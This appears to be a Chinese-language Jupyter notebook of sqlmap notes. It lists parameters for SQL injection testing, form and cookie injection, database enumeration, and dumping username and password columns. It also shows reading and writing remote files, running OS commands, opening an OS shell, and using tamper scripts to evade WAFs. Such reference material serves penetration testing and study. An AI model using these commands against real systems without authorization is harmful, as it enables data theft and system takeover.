{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "superior-seeking",
   "metadata": {},
   "source": [
    "# Sqlmap  常用参数\n",
    "#### 使用版本 python 2.7\n",
    "1. -u 使用get注入\n",
    "2. --level=LEVEL,级别越高,查询参数越多. \n",
    "\t执行测试的等级（1-5，默认为1）,使用–level 参数且数值>=2的时候也会检查cookie里面的参数，当>=3的时候将检查User-agent和Referer.  \n",
    "3. --risk = Risk\n",
    "\t 执行测试的风险（0-3，默认为1）,默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。\n",
    "4. -v  \n",
    "\tERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。\n",
    "5. -m  \n",
    "\t批量注入 \n",
    "6. --mobile  \n",
    "\t模拟测试手机环境站点 \n",
    "7. -batch-smart  \n",
    "\t智能判断测试\n",
    "8. -threads  \n",
    "\t线程数，如果你想让sqlmap跑的更快，可以更改这个线程 数的值，默认值为10\n",
    "    \n",
    "9. -r 一般用于post  \n",
    "\t指定参数post注入 sqlmap.py -r post.txt -p 注入参数\n",
    "10. -p  \n",
    "\t-p 后面接参数，针对单个参数注入,比如post里我们知道id=1这个参数可以注入,那么直接-p id\n",
    "11. sqlmap自动填写表单注入  \n",
    "    sqlmap.py -u url --forms --dbs //默认情况下sqlmap会自动的探测应用后端的数据库类型:mysql  \n",
    "    --forms后面还可以跟的参数:  \n",
    "    --current-user :大多数数据库检测到数据库管理系统为当前用户  \n",
    "    --current-db: 当前连接数据库名  \n",
    "    --is-dba:判断当前用户是否为管理  \n",
    "    --users: 列出数据库所有用户  \n",
    "    sqlmap.py -u url --forms --dbs//查出数据库  \n",
    "    sqlmap.py -u url --forms --current-db  \n",
    "    sqlmap.py -u url --forms -D 数据库名称 --tables//查出数据库后,填写数据库名接着查表名有哪些  \n",
    "    sqlmap.py -u url --forms -D 数据库名称 -T 表名 --columns//查到表名后再查哪些字段  \n",
    "    sqlmap.py -u url --forms -D 数据库名称 -T 表名 -C username,password --dump//查到字段后再查对应字段里的值  \n",
    "12. cookie注入,先把cookie值保存2.txt,然后对ant[uname]这个键值对进行注入  \n",
    "    py -2 sqlmap.py -r 2.txt -p ant[uname] --dbs --level=2\n",
    "13. sqlmap.py -u URL --file-read pth  读取远程电脑pth下的文件  \n",
    "    sqlmap.py -u URL --file-write pth --file-dest pth2  上传本机电脑pth下的文件到url的pth2路径  \n",
    "    sqlmap.py -u URL --os-cmd=\"net user\"   执行cmd命令,前提是 --is-dba 检测结果为true,这个是判断当前用户是否为管理员权限  \n",
    "    sqlmap.py -u URL --os-shell   系统交互的shell"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "collect-toddler",
   "metadata": {},
   "source": [
    "# 过WAF模块在tamper文件夹里\n",
    "要调用哪个模块就接语法--tamper \"模块名\"  \n",
    "比如: sqlmap.py -u URL --tamper \"apostrophemask.py\"  \n",
    "一起调用多个tamper脚本过waf sqlmap.py-u “http://192.168.136.131/sqlmap/mysql/get_int.php?id=1” --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "unlimited-national",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
